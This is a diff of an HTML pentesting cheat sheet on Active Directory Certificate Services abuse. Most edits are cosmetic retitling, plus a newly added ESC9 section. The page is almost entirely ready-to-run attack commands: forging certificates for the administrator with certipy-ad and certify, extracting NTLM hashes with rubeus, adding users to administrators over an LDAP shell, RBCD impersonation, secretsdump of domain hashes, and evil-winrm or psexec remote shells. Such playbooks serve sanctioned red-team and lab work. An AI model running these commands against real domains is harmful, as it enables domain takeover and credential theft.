@@ -340,7 +340,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="enum-from-linux">Enum (From Linux)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">certipy-ad</button>
+<button data-tabset="set1" data-tabcontent="tab1" >certipy-ad</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
 
@@ -351,7 +351,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h3 id="enum-from-windows">Enum (From Windows)</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">powershell</button>
+<button data-tabset="set2" data-tabcontent="tab1" >powershell</button>
 
 <button data-tabset="set2" data-tabcontent="tab2" >certify</button>
 
@@ -377,14 +377,14 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">get-adcstemplate | fl displayname
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a></em></small></p></div></p>
 <hr>
-<h3 id="request-a-certificate-of-current-user">Request a certificate of current user</h3>
+<h3 id="request-a-certificate-of-current-user">Request a Certificate of Current User</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set3" data-tabcontent="tab1" >Linux</button>
 
 <button data-tabset="set3" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-certificate">1. Request a certificate</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -ca &lt;CA&gt; -template User -target &lt;DC&gt; -pfx &lt;USER&gt;.pfx
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-certificate">1. Request a Certificate</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -ca &lt;CA&gt; -template User -target &lt;DC&gt; -pfx &#39;&lt;USER&gt;.pfx&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">&#39;oorend@rebound.htb&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -ca rebound-DC01-CA -template User -target dc01.rebound.htb -pfx oorend.pfx
 </span></span><span class="line"><span class="cl"><span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
@@ -394,16 +394,16 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN &#39;oorend@rebound.htb&#39;
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is &#39;S-1-5-21-4078382237-1492182817-2568127209-7682&#39;
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved certificate and private key to &#39;oorend.pfx&#39;
-</span></span></span></code></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM hash</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx &lt;USER&gt;.pfx
+</span></span></span></code></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx &#39;&lt;USER&gt;.pfx&#39;
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><h4 id="1-request-a-certificate">1. Request a certificate</h4>
+<div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><h4 id="1-request-a-certificate">1. Request a Certificate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\certify.exe request /ca:&lt;CA&gt; /template:User
 </span></span></span></code></pre></div><h4 id="2-convert-pem-to-pfx">2. Convert pem to pfx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ...<span class="o">[</span>SNIP<span class="o">]</span>... -----END CERTIFICATE----- to cert.pem
 </span></span><span class="line"><span class="cl"><span class="go">openssl pkcs12 -in cert.pem -keyex -CSP &#39;Microsoft Enhanced Cryptographic Provider v1.0&#39; -export -out cert.pfx
-</span></span></span></code></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM hash</h4>
+</span></span></span></code></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&#39;&lt;USER&gt;&#39; /certificate:cert.pfx /getcredentials /show /nowrap
 </span></span></span></code></pre></div></div></p>
 <hr>
@@ -416,14 +416,14 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">| Requires Management Approval   : False                   |
 </span></span></span><span class="line"><span class="cl"><span class="go">| Authorized Signatures Required : 0                       |
 </span></span></span><span class="line"><span class="cl"><span class="go">+----------------------------------------------------------+
-</span></span></span></code></pre></div><h4 id="abuse-1-add-smartcard-logon">Abuse #1: Add smartcard logon</h4>
+</span></span></span></code></pre></div><h4 id="abuse-1-add-smartcard-logon">Abuse #1: Add Smartcard Logon</h4>
 <p>
-<button data-tabset="set4" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set4" data-tabcontent="tab1" >Windows</button>
 
-<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-import-modules">1. Import modules</h4>
+<div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><h4 id="1-import-modules">1. Import Modules</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\ADCS.ps1
-</span></span></span></code></pre></div><h4 id="2-add-smartcart-logon">2. Add smartcart logon</h4>
+</span></span></span></code></pre></div><h4 id="2-add-smartcart-logon">2. Add Smartcart Logon</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-SmartCardCertificate -Identity Administrator -TemplateName &lt;VULN_TEMPLATE&gt; -NoSmartCard -Verbose
 </span></span></span></code></pre></div><h4 id="3-get-cert_thumbprint">3. Get Cert_Thumbprint</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-ChildItem cert:\currentuser\my -recurse
@@ -432,26 +432,26 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><h4 id="5-remote">5. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-psexec -hashes :&lt;HASH&gt; administrator@&lt;DOMAIN&gt; cmd.exe
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/cfalta/PoshADCS">PoshADCS</a></em></small></p></div></p>
-<h4 id="abuse-2-set-alternative-name">Abuse #2: Set alternative name</h4>
+<h4 id="abuse-2-set-alternative-name">Abuse #2: Set Alternative Name</h4>
 <p>
-<button data-tabset="set5" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set5" data-tabcontent="tab1" >Linux</button>
 
 <button data-tabset="set5" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-generate-a-cert-with-altname">1. Generate a cert with altname</h4>
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><h4 id="1-generate-a-cert-with-altname">1. Generate a Cert with Altname</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -target &lt;TARGET&gt; -upn administrator@&lt;DOMAIN&gt; -ca &lt;CA&gt; -template &lt;VULN_TEMPLATE&gt;
-</span></span></span></code></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM hash</h4>
+</span></span></span></code></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx administrator.pfx
 </span></span></span></code></pre></div><h4 id="3-remote">3. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><h4 id="1-generate-a-cert-with-altname">1. Generate a cert with altname</h4>
+<div class="tabcontent" data-tabset="set5" data-tabcontent="tab2"><h4 id="1-generate-a-cert-with-altname">1. Generate a Cert with Altname</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\certify.exe request /ca:&lt;CA&gt; /template:&lt;VULN_TEMPLATE&gt; /altname:administrator
 </span></span></span></code></pre></div><h4 id="2-convert-pem-to-pfx">2. Convert pem to pfx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ... -----END CERTIFICATE----- to cert.pem
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy -----BEGIN RSA PRIVATE KEY----- ...<span class="o">[</span>SNIP<span class="o">]</span>... -----END CERTIFICATE----- to cert.pem
 </span></span><span class="line"><span class="cl"><span class="go">openssl pkcs12 -in cert.pem -keyex -CSP &#39;Microsoft Enhanced Cryptographic Provider v1.0&#39; -export -out administrator.pfx
-</span></span></span></code></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM hash</h4>
+</span></span></span></code></pre></div><h4 id="3-get-ntlm-hash">3. Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
 </span></span></span></code></pre></div><h4 id="4-remote">4. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Remote
@@ -459,23 +459,23 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h4 id="abuse-3-set-mspki-certificate-name-flag">Abuse #3: Set msPKI-Certificate-Name-Flag</h4>
 <p>
-<button data-tabset="set6" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set6" data-tabcontent="tab1" >Windows</button>
 
-<div class="tabcontent" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-import-adcstemplate-module">1. Import ADCSTemplate module</h4>
+<div class="tabcontent" data-tabset="set6" data-tabcontent="tab1"><h4 id="1-import-adcstemplate-module">1. Import ADCSTemplate Module</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module .\ADCSTemplate.psm1
-</span></span></span></code></pre></div><h4 id="2-create-template-with-mspki-certificate-name-flag-modified">2. Create template with msPKI-Certificate-Name-Flag modified</h4>
+</span></span></span></code></pre></div><h4 id="2-create-template-with-mspki-certificate-name-flag-modified">2. Create Template with msPKI-Certificate-Name-Flag Modified</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Export-ADCSTemplate -displayName &lt;VULN_TEMPLATE&gt; &gt; template.json
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">template</span> <span class="o">=</span> cat template.json -raw <span class="p">|</span> ConvertFrom-Json
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template.<span class="s1">&#39;msPKI-Certificate-Name-Flag&#39;</span> <span class="o">=</span> 0x1
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span>template <span class="p">|</span> ConvertTo-Json <span class="p">|</span> Set-Content template_mod.json
-</span></span></code></pre></div><h4 id="3-create-a-new-certificate-template">3. Create a new certificate template</h4>
+</span></span></code></pre></div><h4 id="3-create-a-new-certificate-template">3. Create a New Certificate Template</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">New-ADCSTemplate -DisplayName &#39;vuln_esc1&#39; -Publish -JSON (cat template_mod.json -raw)
-</span></span></span></code></pre></div><h4 id="4-allow-the-user-to-enroll-in-the-certificate">4. Allow the user to enroll in the certificate</h4>
+</span></span></span></code></pre></div><h4 id="4-allow-the-user-to-enroll-in-the-certificate">4. Allow the User to Enroll in the Certificate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Set permissions on the new template to allow a specific user to enroll in the certificate
 </span></span><span class="line"><span class="cl"><span class="go">Set-ADCSTemplateACL -DisplayName &#39;vuln_esc1&#39; -type allow -identity &#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39; -enroll
-</span></span></span></code></pre></div><h4 id="5-request-a-cert-with-altname">5. Request a cert with altname</h4>
+</span></span></span></code></pre></div><h4 id="5-request-a-cert-with-altname">5. Request a Cert with Altname</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\certify.exe request /ca:&lt;CA&gt; /template:vuln_esc1 /altname:administrator
-</span></span></span></code></pre></div><h4 id="6-get-ntlm-hash">6. Get NTLM hash</h4>
+</span></span></span></code></pre></div><h4 id="6-get-ntlm-hash">6. Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials /show /nowrap
 </span></span></span></code></pre></div><h4 id="7-remote">7. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-psexec -hashes :&lt;HASH&gt; administrator@&lt;DOMAIN&gt; cmd.exe
@@ -490,47 +490,63 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">+---------------------+
 </span></span></span></code></pre></div><br>
 <p>
-<button data-tabset="set7" data-tabcontent="tab1" class="active">Linux</button>
+<button data-tabset="set7" data-tabcontent="tab1" >Linux</button>
 
-<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><h4 id="1-use-manageca-privilege-to-add-manage-certificates-permission">1. Use ManageCA privilege to add manage certificates permission</h4>
+<div class="tabcontent" data-tabset="set7" data-tabcontent="tab1"><h4 id="1-use-manageca-privilege-to-add-manage-certificates-permission">1. Use ManageCA Privilege to Add Manage Certificates Permission</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad ca -ca &lt;CA&gt; -add-officer &#39;&lt;USER&gt;&#39; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
 </span></span><span class="line"><span class="cl"><span class="go">certipy-ad find -dc-ip &lt;DC&gt; -ns &lt;DC_IP&gt; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -vulnerable -stdout
-</span></span></span></code></pre></div><h4 id="2-request-a-cert-based-on-subca">2. Request a cert based on SubCA</h4>
+</span></span></span></code></pre></div><h4 id="2-request-a-cert-based-on-subca">2. Request a Cert Based on SubCA</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Take note of the Request ID
 </span></span><span class="line"><span class="cl"><span class="go">certipy-ad req -ca &lt;CA&gt; -target &lt;TARGET_DOMAIN&gt; -template SubCA -upn administrator@&lt;DOMAIN&gt; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="3-issue-request-using-manageca-and-manage-certificates-privilege">3. Issue request using ManageCA and Manage Certificates privilege</h4>
+</span></span></span></code></pre></div><h4 id="3-issue-request-using-manageca-and-manage-certificates-privilege">3. Issue Request Using ManageCA and Manage Certificates Privilege</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad ca -ca &lt;CA&gt; -issue-request &lt;REQUEST_ID&gt; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="4-request-a-certificate-from-ca-on-the-target-domain">4. Request a certificate from CA on the target domain</h4>
+</span></span></span></code></pre></div><h4 id="4-request-a-certificate-from-ca-on-the-target-domain">4. Request a Certificate from CA on the Target Domain</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -ca &lt;CA&gt; -target &lt;TARGET_DOMAIN&gt; -retrieve &lt;REQUEST_ID&gt; -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="5-get-ntlm-hash">5. Get NTLM hash</h4>
+</span></span></span></code></pre></div><h4 id="5-get-ntlm-hash">5. Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -dc-ip &lt;DC&gt;
 </span></span></span></code></pre></div><h4 id="6-remote">6. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
 </span></span></span></code></pre></div></div></p>
 <hr>
+<h3 id="esc9">ESC9</h3>
+<p>
+<button data-tabset="set8" data-tabcontent="tab1" >Linux</button>
+
+<div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-modify-target-users-userprincipalname-with-genericallgenericwrite">1. Modify Target User&rsquo;s userPrincipalName (With GenericAll/GenericWrite)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad account update -username &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -hashes &lt;HASH&gt; -user &lt;TARGET_USER&gt; -upn Administrator
+</span></span></span></code></pre></div><h4 id="2-request-a-cert-of-targer-user">2. Request a Cert of Targer User</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -username &#39;&lt;TARGET_USER&gt;@&lt;DOMAIN&gt;&#39; -password &#39;&lt;PASSWORD&gt;&#39; -ca &lt;CA&gt; -template &lt;VULN_TEMPLATE&gt;
+</span></span></span></code></pre></div><h4 id="3-change-back-target-users-userprincipalname">3. Change Back Target User&rsquo;s userPrincipalName</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad account update -username &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -hashes &lt;HASH&gt; -user &lt;TARGET_USER&gt; -upn &#39;&lt;TARGET_USER&gt;@&lt;DOMAIN&gt;&#39;
+</span></span></span></code></pre></div><h4 id="4-get-ntlm-hash">4. Get NTLM Hash</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad auth -pfx administrator.pfx -domain certified.htb
+</span></span></span></code></pre></div><h4 id="5-remote">5. Remote</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET&gt; -u administrator -H &lt;HASH&gt;
+</span></span></span></code></pre></div></div></p>
+<hr>
 <h3 id="workaround-kerberos-sessionerror-kdc_err_padata_type_nosupp">Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP</h3>
-<h4 id="1-create-key-and-cert-from-pfx">1. Create key and cert from pfx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &lt;USER&gt;.pfx -nocert -out &lt;USER&gt;.key
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &lt;USER&gt;.pfx -nokey -out &lt;USER&gt;.crt
+<h4 id="1-create-key-and-cert-from-pfx">1. Create Key and Cert from pfx</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &#39;&lt;USER&gt;.pfx&#39; -nocert -out &#39;&lt;USER&gt;.key&#39;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &#39;&lt;USER&gt;.pfx&#39; -nokey -out &#39;&lt;USER&gt;.crt&#39;
 </span></span></span></code></pre></div><p>
-<button data-tabset="set8" data-tabcontent="tab1" class="active">LDAP Shell</button>
+<button data-tabset="set9" data-tabcontent="tab1" >LDAP Shell</button>
 
-<button data-tabset="set8" data-tabcontent="tab2" >RBCD</button>
+<button data-tabset="set9" data-tabcontent="tab2" >RBCD</button>
 
-<div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-get-a-ldap-shell">1. Get a LDAP shell</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt &lt;USER&gt;.crt -key &lt;USER&gt;.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
-</span></span></span></code></pre></div><h4 id="2-add-user-to-administrators-group">2. Add user to administrators group</h4>
+<div class="tabcontent" data-tabset="set9" data-tabcontent="tab1"><h4 id="1-get-a-ldap-shell">1. Get a LDAP Shell</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt &#39;&lt;USER&gt;.crt&#39; -key &#39;&lt;USER&gt;.key&#39; -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
+</span></span></span></code></pre></div><h4 id="2-add-user-to-administrators-group">2. Add User to Administrators Group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">add_user_to_group &#39;&lt;USER&gt;&#39; administrators
 </span></span></span></code></pre></div><h4 id="3-remote">3. Remote</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">evil-winrm -i &lt;TARGET_DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39;
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/AlmondOffSec/PassTheCert">PassTheCert</a></em></small></p></div>
 
-<div class="tabcontent" data-tabset="set8" data-tabcontent="tab2"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
+<div class="tabcontent" data-tabset="set9" data-tabcontent="tab2"><h4 id="1-rbcd-attack">1. RBCD Attack</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to &#39;&lt;TARGET_COMPUTER&gt;$&#39; -delegate-from &#39;Evil_Computer$&#39; -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
-</span></span></span></code></pre></div><h4 id="2-request-a-service-ticket">2. Request a service ticket</h4>
+</span></span></span></code></pre></div><h4 id="2-request-a-service-ticket">2. Request a Service Ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; python3 impacket-getST -spn &#39;cifs/&lt;TARGET_DOMAIN&gt;&#39; -impersonate Administrator &#39;&lt;DOMAIN&gt;/Evil_Computer$:&lt;GENERATED_PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets dump</h4>
+</span></span></span></code></pre></div><h4 id="3-secrets-dump">3. Secrets Dump</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=Administrator.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-secretsdump &#39;&lt;DOMAIN&gt;/administrator@&lt;TARGET_DOMAIN&gt;&#39; -k -no-pass -just-dc-ntlm
 </span></span></span></code></pre></div><h4 id="5-remote">5. Remote</h4>
